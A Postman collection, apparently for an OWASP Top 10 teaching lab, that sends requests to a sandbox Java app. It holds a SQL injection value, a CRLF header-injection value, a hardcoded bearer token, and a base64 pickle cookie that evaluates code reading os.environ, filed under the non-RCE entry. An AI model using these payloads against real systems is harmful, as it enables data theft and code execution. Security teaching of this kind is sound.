@@ -1,0 +1,305 @@
+{
+  "info": {
+    "_postman_id": "7a42b9be-3497-46b7-ba43-f2d4817261b7",
+    "name": "Java-OWASP",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+    "_exporter_id": "3868925"
+  },
+  "item": [
+    {
+      "name": "A01",
+      "item": [
+        {
+          "name": "A01: Access Control",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{SandBox_BaseURL3000}}/profile?username=alice",
+              "host": ["{{SandBox_BaseURL3000}}"],
+              "path": ["profile"],
+              "query": [
+                {
+                  "key": "username",
+                  "value": "alice"
+                }
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "A02",
+      "item": [
+        {
+          "name": "A02: All data exploit",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{SandBox_BaseURL3000}}/all-data",
+              "host": ["{{SandBox_BaseURL3000}}"],
+              "path": ["all-data"]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "A02: Change password",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{SandBox_BaseURL3000}}/change-password?password=newpassword",
+              "host": ["{{SandBox_BaseURL3000}}"],
+              "path": ["change-password"]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "A02: Register",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{SandBox_BaseURL3000}}/register?username=newUser&password=password1234",
+              "host": ["{{SandBox_BaseURL3000}}"],
+              "path": ["register"]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "A02: Login",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{SandBox_BaseURL3000}}/login?username=alice&password=1234",
+              "host": ["{{SandBox_BaseURL3000}}"],
+              "path": ["login"]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "A03",
+      "item": [
+        {
+          "name": "A03: Get customer by name",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{SandBox_BaseURL3000}}/customer?name=alice",
+              "host": ["{{SandBox_BaseURL3000}}"],
+              "path": ["customer"],
+              "query": [
+                {
+                  "key": "name",
+                  "value": "alice"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "A03: SQL Injection",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{SandBox_BaseURL3000}}/customer?name=' OR '1'='1",
+              "host": ["{{SandBox_BaseURL3000}}"],
+              "path": ["customer"],
+              "query": [
+                {
+                  "key": "name",
+                  "value": "' OR '1'='1"
+                }
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "A04",
+      "item": [
+        {
+          "name": "A04: Buy a product",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {
+              "raw": "{{SandBox_BaseURL3000}}/buy-product",
+              "host": ["{{SandBox_BaseURL3000}}"],
+              "path": ["buy-product"]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "A07",
+      "item": [
+        {
+          "name": "A07: Register",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{SandBox_BaseURL3000}}/register?username=bondJames&password=IamY0u",
+              "host": ["{{SandBox_BaseURL3000}}"],
+              "path": ["register"]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "A08",
+      "item": [
+        {
+          "name": "A08: Get profile from cookie",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Cookie",
+                "value": "profile=gASVOQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwdc3RyKF9faW1wb3J0X18oJ29zJykuZW52aXJvbimUhZRSlC4=",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{SandBox_BaseURL3000}}/profile",
+              "host": ["{{SandBox_BaseURL3000}}"],
+              "path": ["profile"]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "A08: Get profile from cookie - RCE",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Cookie",
+                "value": "profile=eyJpZCI6MiwidXNlcm5hbWUiOiJib2IifQ==",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{SandBox_BaseURL3000}}/profile",
+              "host": ["{{SandBox_BaseURL3000}}"],
+              "path": ["profile"]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "A09",
+      "item": [
+        {
+          "name": "A09: CRLF Header Injection",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "content-type",
+                "value": "application/json\\r\\n\\r\\nGET /secret HTTP/1.1",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{SandBox_BaseURL3000}}/profile",
+              "host": ["{{SandBox_BaseURL3000}}"],
+              "path": ["profile"]
+            }
+          },
+          "response": []
+        }
+      ]
+    }
+  ],
+  "auth": {
+    "type": "bearer",
+    "bearer": [
+      {
+        "key": "token",
+        "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhbGljZSIsImlhdCI6MTY4NjczODE5Nn0.TPzLmi6Hd0OHUSgyj2JrYvTyldJt7XkeVI5uPMb-PEU",
+        "type": "string"
+      }
+    ]
+  },
+  "event": [
+    {
+      "listen": "prerequest",
+      "script": {
+        "type": "text/javascript",
+        "exec": [""]
+      }
+    },
+    {
+      "listen": "test",
+      "script": {
+        "type": "text/javascript",
+        "exec": [""]
+      }
+    }
+  ],
+  "variable": [
+    {
+      "key": "SandBox_BaseURL3000",
+      "value": "https://4nh9pr-8005.csb.app/MyApp"
+    }
+  ]
+}
